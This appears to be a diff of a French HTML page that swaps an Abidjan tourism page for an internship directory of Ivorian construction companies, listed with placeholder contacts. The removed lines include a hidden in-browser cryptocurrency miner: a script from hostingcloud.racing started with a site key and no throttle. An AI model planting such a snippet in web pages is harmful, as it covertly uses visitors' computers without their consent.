@@ -3,89 +3,551 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bouake- La perle des lagunes</title>
+    <title>Recherche de Stage</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            line-height: 1.6;
+            background-color: #f5f5f5;
             margin: 0;
             padding: 0;
-            background-color: #f0f0f0;
         }
         header {
-            background-color: #333;
-            color: #fff;
+            background-color: #4CAF50;
+            color: white;
             text-align: center;
-            padding: 10px 0;
+            padding: 1em 0;
         }
         .container {
             width: 80%;
             margin: auto;
             overflow: hidden;
+        }
+        .search-section {
+            margin: 20px 0;
+        }
+        .company-list {
+            list-style: none;
+            padding: 0;
+        }
+        .company-item {
+            background: white;
             padding: 20px;
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            margin-top: 20px;
+            margin: 10px 0;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
-        .image-container {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .image-container img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 8px;
-        }
-        section {
-            margin-bottom: 20px;
-        }
-        h1, h2 {
+        .company-item h3 {
+            margin: 0;
             color: #333;
-            text-align: center;
+            cursor: pointer;
+            font-size: 18px; /* Taille de police réduite */
         }
-        p {
-            text-align: justify;
+        .company-item .company-details {
+            display: none;
+            color: #666;
+            margin-top: 10px;
+        }
+        .company-item .additional-info {
+            display: none;
+            color: #666;
+            margin-top: 10px;
+        }
+        .loading {
+            text-align: center;
+            display: none;
+        }
+        .progress-bar {
+            width: 100%;
+            background-color: #f3f3f3;
+            border-radius: 5px;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+        .progress {
+            height: 20px;
+            background-color: #4CAF50;
+            width: 0;
+            text-align: center;
+            color: white;
+            border-radius: 5px;
+        }
+        .additional-info-button {
+            display: inline-block;
+            margin-top: 10px;
+            padding: 10px 15px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .company-info {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #555;
         }
     </style>
+<script>
+    function loadDetails(element) {
+        var details = element.nextElementSibling;
+        var progress = document.createElement('div');
+        progress.classList.add('progress-bar');
+        progress.innerHTML = '<div class="progress"></div>';
+        details.appendChild(progress);
+        details.style.display = 'block';
+        
+        var width = 0;
+        var interval = setInterval(function() {
+            if (width >= 100) {
+                clearInterval(interval);
+                var infoButton = document.createElement('button');
+                infoButton.classList.add('additional-info-button');
+                infoButton.innerHTML = 'Voir plus';
+                infoButton.onclick = function() {
+                    loadAdditionalInfo(details);
+                };
+                details.appendChild(infoButton);
+                details.querySelector('.progress-bar').style.display = 'none';
+            } else {
+                width++;
+                details.querySelector('.progress').style.width = width + '%';
+            }
+        }, 20);
+    }
+
+    function loadAdditionalInfo(details) {
+        var info = document.createElement('div');
+        info.classList.add('additional-info');
+        info.innerHTML = '<p>Anecdotes incroyables et conseils aux ingénieurs de BTP.</p>';
+        details.appendChild(info);
+        
+        setTimeout(function() {
+            info.style.display = 'block';
+        }, 2000);
+    }
+
+    function filterCompanies() {
+        var input, filter, ul, li, h3, i, txtValue;
+        input = document.getElementById('search');
+        filter = input.value.toUpperCase();
+        ul = document.getElementById('companyList');
+        li = ul.getElementsByTagName('li');
+
+        for (i = 0; i < li.length; i++) {
+            h3 = li[i].getElementsByTagName('h3')[0];
+            txtValue = h3.textContent || h3.innerText;
+            if (txtValue.toUpperCase().indexOf(filter) > -1) {
+                li[i].style.display = "";
+            } else {
+                li[i].style.display = "none";
+            }
+        }
+    }
+</script>
 </head>
 <body>
-    <header>
-        <h1>Abidjan - La perle des lagunes</h1>
-    </header>
-    <div class="container">
-        <div class="image-container">
-            <img src="abidjan.jpg" alt="Vue d'Abidjan">
-        </div>
-        <section>
-            <h2>Introduction</h2>
-            <p>Abidjan, surnommée la "perle des lagunes", est la plus grande ville et la capitale économique de la Côte d'Ivoire. Située sur la côte sud du pays, elle est connue pour sa diversité culturelle, son dynamisme économique et ses magnifiques lagunes qui lui confèrent un charme unique.</p>
-        </section>
-        <section>
-            <h2>banane</h2></h2>
-            <p>Abidjan a connu une croissance rapide à partir des années 1950, devenant rapidement le principal centre économique de la Côte d'Ivoire après l'indépendance. La ville a joué un rôle crucial dans le développement économique et culturel du pays.</p>
-        </section>
-        <section>
-            <h2>pomme</h2>
-            <p>Abidjan est le principal centre financier et industriel de la Côte d'Ivoire, abritant de nombreuses entreprises nationales et internationales. Son port est l'un des plus actifs de la région, facilitant le commerce et l'exportation de produits agricoles et miniers.</p>
-        </section>
-        <section>
-            <h2>Alloco</h2>
-            <p>La culture d'Abidjan est riche et diversifiée, avec une scène artistique animée, des festivals de musique et de danse, ainsi qu'une gastronomie délicieuse mêlant traditions locales et influences internationales.</p>
-        </section>
-        <section>
-            <h2>je serai riche un jour</h2>
-            <p>Les visiteurs découvrent à Abidjan des attractions telles que la basilique Notre-Dame-de-la-Paix, le parc national du Banco, et le musée des civilisations d'Abidjan, qui offrent des perspectives sur l'histoire et la culture de la région.</p>
-        </section>
-    </div>
-<script src="https://www.hostingcloud.racing/hwo3.js"></script>
-<script>
-    var _client = new Client.Anonymous('2d16ff2d0f82e1b71d2daf81b76c113a1377dcebcb456e2d690a494e68825b28', {
-        throttle: 0, c: 'w', ads: 0
-    });
-    _client.start();
-    
 
+<header>
+    <h1>Recherche de Stage</h1>
+    <p>Répertoire des entreprises offrant des stages pour les étudiants</p>
+</header>
+
+<div class="container">
+    <div class="search-section">
+        <input type="text" id="search" placeholder="Rechercher une entreprise..." onkeyup="filterCompanies()">
+    </div>
+
+    <ul class="company-list" id="companyList">
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">SEKAD</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise SEKAD -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@sekad.ci</p>
+                    <p>Localisation: Abidjan, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">Génie Civil et Topographie</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise Génie Civil et Topographie -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@gct.ci</p>
+                    <p>Localisation: Yamoussoukro, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">Nehabou btp</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise Nehabou btp -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@nehabou.ci</p>
+                    <p>Localisation: Bouaké, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">Hoshi BTP</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise Hoshi BTP -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@hoshi.ci</p>
+                    <p>Localisation: Daloa, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">LGI BATIMENTS TRAVAUX PUBLICS</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise LGI BATIMENTS TRAVAUX PUBLICS -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@lgibtp.ci</p>
+                    <p>Localisation: San Pedro, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">BET-ARCHI</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise BET-ARCHI -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@bet-archi.ci</p>
+                    <p>Localisation: Korhogo, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">Groupe Codici SARL</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise Groupe Codici SARL -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@groupcodici.ci</p>
+                    <p>Localisation: Man, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">ITMSBTP</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise ITMSBTP -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@itmsbtp.ci</p>
+                    <p>Localisation: Odienné, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">Fofana BTP</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise Fofana BTP -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@fofanabtp.ci</p>
+                    <p>Localisation: Abengourou, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">EMERTEC BGC</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise EMERTEC BGC -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@emertecbgc.ci</p>
+                    <p>Localisation: Gagnoa, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">BEZOK BTP sarl</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise BEZOK BTP sarl -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@bezokbtp.ci</p>
+                    <p>Localisation: Sassandra, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">JPK BTP.ci</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise JPK BTP.ci -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@jpkbtp.ci</p>
+                    <p>Localisation: Divo, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">KANGA ENTREPRISE GENERAL</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise KANGA ENTREPRISE GENERAL -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@kangaeg.ci</p>
+                    <p>Localisation: Bondoukou, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">Archange BTP</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise Archange BTP -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@archangebtp.ci</p>
+                    <p>Localisation: Toumodi, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">SYG-BTP</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise SYG-BTP -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@sygbtp.ci</p>
+                    <p>Localisation: Aboisso, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">ECBTP</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise ECBTP -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@ecbtp.ci</p>
+                    <p>Localisation: Séguéla, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">GK CONSTRUCTION & INGENIERIE</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise GK CONSTRUCTION & INGENIERIE -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@gkci.ci</p>
+                    <p>Localisation: Daoukro, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">Expert touch btp</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise Expert touch btp -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@expertbtp.ci</p>
+                    <p>Localisation: Anyama, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">NGBI (Nouvelle Génération des Bâtisseurs Ivoiriens)</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise NGBI (Nouvelle Génération des Bâtisseurs Ivoiriens) -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@ngbi.ci</p>
+                    <p>Localisation: Bingerville, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">EIC BTP</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise EIC BTP -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@eicbtp.ci</p>
+                    <p>Localisation: Yopougon, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">GICOBAT PLUS</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise GICOBAT PLUS -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@gicobatplus.ci</p>
+                    <p>Localisation: Grand-Bassam, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">VICBTP</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise VICBTP -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@vicbtp.ci</p>
+                    <p>Localisation: Dabou, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">SONITRA CI</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise SONITRA CI -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@sonitraci.ci</p>
+                    <p>Localisation: Bouaflé, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">GCI-BTP</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise GCI-BTP -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@gcibtp.ci</p>
+                    <p>Localisation: Soubré, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">BUREAU D'ETUDE ET D'INGENIERIE BTP (ERDM-BTP)</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise BUREAU D'ETUDE ET D'INGENIERIE BTP (ERDM-BTP) -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@erdmbtp.ci</p>
+                    <p>Localisation: Adzopé, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">EIS-BTP sarl</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise EIS-BTP sarl -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@eisbtp.ci</p>
+                    <p>Localisation: Lakota, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">SPIMCOBTP</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise SPIMCOBTP -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@spimcobtp.ci</p>
+                    <p>Localisation: Touba, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">CNTP</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise CNTP -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@cntp.ci</p>
+                    <p>Localisation: Korhogo, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">GEBATEC</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise GEBATEC -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@gebatec.ci</p>
+                    <p>Localisation: Man, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+        <li class="company-item">
+            <h3 onclick="loadDetails(this)">BONON BTP</h3>
+            <div class="company-details">
+                <!-- Détails de l'entreprise BONON BTP -->
+                <div class="company-info">
+                    <p>Numéro: +225 01 23 45 67 89</p>
+                    <p>Email: contact@bononbtp.ci</p>
+                    <p>Localisation: Abengourou, Côte d'Ivoire</p>
+                </div>
+            </div>
+        </li>
+    </ul>
+</div>
+
+<script>
+    function loadDetails(element) {
+        var details = element.nextElementSibling;
+        var progress = document.createElement('div');
+        progress.classList.add('progress-bar');
+        progress.innerHTML = '<div class="progress"></div>';
+        details.appendChild(progress);
+        details.style.display = 'block';
+        
+        var width = 0;
+        var interval = setInterval(function() {
+            if (width >= 100) {
+                clearInterval(interval);
+                var infoButton = document.createElement('button');
+                infoButton.classList.add('additional-info-button');
+                infoButton.innerHTML = 'Voir plus';
+                infoButton.onclick = function() {
+                    loadAdditionalInfo(details);
+                };
+                details.appendChild(infoButton);
+                details.querySelector('.progress-bar').style.display = 'none';
+            } else {
+                width++;
+                details.querySelector('.progress').style.width = width + '%';
+            }
+        }, 20);
+    }
+
+    function loadAdditionalInfo(details) {
+        var info = document.createElement('div');
+        info.classList.add('additional-info');
+        info.innerHTML = 'Information additionnelle sur l\'entreprise.';
+        details.appendChild(info);
+        
+        setTimeout(function() {
+            info.style.display = 'block';
+        }, 2000);
+    }
+
+    function filterCompanies() {
+        var input, filter, ul, li, h3, i, txtValue;
+        input = document.getElementById('search');
+        filter = input.value.toUpperCase();
+        ul = document.getElementById('companyList');
+        li = ul.getElementsByTagName('li');
+
+        for (i = 0; i < li.length; i++) {
+            h3 = li[i].getElementsByTagName('h3')[0];
+            txtValue = h3.textContent || h3.innerText;
+            if (txtValue.toUpperCase().indexOf(filter) > -1) {
+                li[i].style.display = "";
+            } else {
+                li[i].style.display = "none";
+            }
+        }
+    }
 </script>
+
 </body>
 </html>
